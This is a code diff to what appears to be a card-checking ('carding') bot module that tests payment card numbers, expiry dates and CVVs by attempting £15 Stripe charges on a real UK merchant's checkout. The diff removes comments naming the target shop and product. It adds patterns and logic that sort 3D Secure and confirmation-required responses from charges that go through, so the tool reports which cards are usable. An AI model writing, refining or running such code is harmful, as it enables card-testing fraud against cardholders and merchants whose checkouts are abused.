@@ -1,8 +1,6 @@
 # BOT/gates/charge/stripe/scharge15.py
 # Stripe Charge 15£ - Compatible with WAYNE Bot Structure
-# UK website: theheadonista.co.uk
-# Product: red-rose-hair-clip (15£)
-# CORRECTED: Uses universal charge processor - credits deducted AFTER check completes
+
 
 import json
 import asyncio
@@ -264,6 +262,20 @@ class StripeCharge15Checker:
             "authentication required"
         ]
 
+        # 3D Secure and deferred payment patterns
+        self.secure_required_patterns = [
+            r'#wc-stripe-confirm-pi:',
+            r'pi_[a-zA-Z0-9]+_secret_',
+            r'requires_action',
+            r'requires_confirmation',
+            r'authentication_required',
+            r'3ds',
+            r'3d_secure',
+            r'confirm-pi',
+            r'deferred',
+            r'pending'
+        ]
+
     def get_country_emoji(self, country_code):
         """Hardcoded country emoji mapping"""
         country_emojis = {
@@ -413,6 +425,32 @@ class StripeCharge15Checker:
 
         return clean_message
 
+    def is_secure_required_response(self, response_data):
+        """Check if the response indicates 3D Secure or deferred payment is required"""
+        try:
+            if isinstance(response_data, dict):
+                # Check redirect URL for patterns
+                redirect_url = response_data.get('redirect', '').lower()
+
+                for pattern in self.secure_required_patterns:
+                    if re.search(pattern, redirect_url):
+                        logger.warning(f"Secure pattern detected in redirect: {pattern}")
+                        return True
+
+                # Check for other indicators
+                if 'requires_action' in response_data or 'requires_confirmation' in response_data:
+                    return True
+
+                # Check for pi_ and _secret patterns in any field
+                response_str = str(response_data).lower()
+                if 'pi_' in response_str and '_secret_' in response_str:
+                    return True
+
+        except Exception as e:
+            logger.warning(f"Error checking secure response: {e}")
+
+        return False
+
     async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
         if bin_info is None:
             bin_info = await self.get_bin_info(cc)
@@ -421,7 +459,8 @@ class StripeCharge15Checker:
         first_name = html.escape(user_data.get("first_name", "User"))
         badge = user_data.get("plan", {}).get("badge", "🧿")
 
-        if "3D SECURE❎" in message:
+        # Check if this is a 3D Secure case - improved detection
+        if any(pattern in str(message).lower() for pattern in ["3d secure", "authentication required", "3ds", "requires_confirmation", "requires_action", "wc-stripe-confirm-pi"]):
             status_emoji = "❌"
             status_text = "DECLINED"
             message_display = "3D SECURE❎"
@@ -849,7 +888,29 @@ class StripeCharge15Checker:
                 logger.response_debug(f"Parsed JSON Response: {json.dumps(result, indent=2)}")
 
                 if isinstance(result, dict):
+                    # CHECK: If this is a 3D Secure or deferred payment
+                    if self.is_secure_required_response(result):
+                        logger.warning("🔐 3D Secure/Deferred payment detected - marking as DECLINED")
+                        logger.response_debug(f"Secure pattern detected in: {result.get('redirect', '')}")
+                        return {
+                            'success': True,
+                            'status': 'DECLINED',
+                            'message': '3D SECURE❎'
+                        }
+
                     if result.get('result') == 'success' and result.get('redirect'):
+                        # Double check if it's really successful or requires confirmation
+                        redirect_url = result.get('redirect', '').lower()
+
+                        # If redirect contains confirmation patterns, it's likely 3D Secure
+                        if any(pattern in redirect_url for pattern in ['confirm-pi', 'pi_', '_secret_', 'requires_']):
+                            logger.warning("⚠️ Success with confirmation URL - marking as 3D SECURE")
+                            return {
+                                'success': True,
+                                'status': 'DECLINED',
+                                'message': '3D SECURE❎'
+                            }
+
                         logger.success("Checkout successful - Payment APPROVED")
                         logger.response_debug(f"Redirect URL: {result.get('redirect')}")
                         return {
